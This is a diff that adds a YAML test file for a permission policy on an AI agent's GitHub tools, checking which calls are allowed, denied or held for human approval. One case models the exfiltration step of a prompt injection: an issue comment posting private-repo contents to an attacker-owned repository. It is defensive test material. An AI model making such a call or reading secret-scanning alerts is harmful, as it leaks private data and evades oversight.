@@ -1,0 +1,55 @@
+policy: github.yaml
+server: gh
+tools:
+  gh__get_file_contents: { readOnlyHint: true }
+  gh__search_code: { readOnlyHint: true }
+  gh__list_secret_scanning_alerts: { readOnlyHint: true }
+  gh__get_secret_scanning_alert: { readOnlyHint: true }
+  gh__repository_ruleset_read: { readOnlyHint: true }
+  gh__create_repository_ruleset: { readOnlyHint: false }
+  gh__custom_properties_read: { readOnlyHint: true }
+  gh__custom_properties_write: { readOnlyHint: false }
+  gh__add_issue_comment: { readOnlyHint: false }
+  gh__create_gist: { readOnlyHint: false }
+  gh__fork_repository: { readOnlyHint: false }
+  gh__delete_file: { readOnlyHint: false, destructiveHint: true }
+  gh__merge_pull_request: { readOnlyHint: false }
+cases:
+  - call: gh__get_file_contents
+    args: { owner: o, repo: r, path: README.md }
+    expect: allow
+    rule: gh-reads
+  - call: gh__search_code
+    args: { query: "password repo:o/r" }
+    expect: allow
+  - call: gh__list_secret_scanning_alerts
+    args: { owner: o, repo: r }
+    expect: deny
+    rule: gh-no-secrets
+  - call: gh__get_secret_scanning_alert
+    expect: deny
+    rule: gh-no-secrets
+  - name: reading rulesets is harmless
+    call: gh__repository_ruleset_read
+    expect: allow
+  - call: gh__create_repository_ruleset
+    expect: deny
+    rule: gh-no-rulesets
+  - call: gh__custom_properties_read
+    expect: allow
+  - call: gh__custom_properties_write
+    expect: deny
+    rule: gh-no-custom-properties
+  - name: the exfiltration step of the injection is a write, so a human sees it
+    call: gh__add_issue_comment
+    args: { owner: attacker, repo: public, issue_number: 1, body: "contents of the private repo" }
+    expect: require_approval
+    rule: gh-approve-writes
+  - call: gh__create_gist
+    expect: require_approval
+  - call: gh__fork_repository
+    expect: require_approval
+  - call: gh__delete_file
+    expect: require_approval
+  - call: gh__merge_pull_request
+    expect: require_approval
